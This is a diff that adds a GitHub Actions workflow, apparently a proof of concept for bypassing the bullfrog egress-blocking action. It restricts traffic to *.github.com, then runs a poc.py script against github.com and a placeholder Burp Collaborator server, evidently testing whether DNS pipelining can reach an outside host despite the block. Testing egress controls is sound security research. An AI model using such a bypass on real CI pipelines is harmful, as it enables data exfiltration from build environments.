@@ -1,0 +1,23 @@
+name: DNS Pipelining PoC
+on:
+  push:
+    branches:
+      - "*"
+
+jobs:
+  testBullFrog:
+    runs-on: ubuntu-22.04
+    steps:
+      - name: Checkout repository
+        uses: actions/checkout@v4 # This action handles cloning the repository
+
+
+      - name: Set up bullfrog to block everything
+        uses: bullfrogsec/bullfrog@1831f79cce8ad602eef14d2163873f27081ebfb3 # v0.8.4
+        with:
+           egress-policy: block
+           allowed-domains: |
+             *.github.com
+      - name: Test connectivity
+        run: |
+          python3 poc.py github.com YOUR_BURP_COLLABORATOR_SERVER
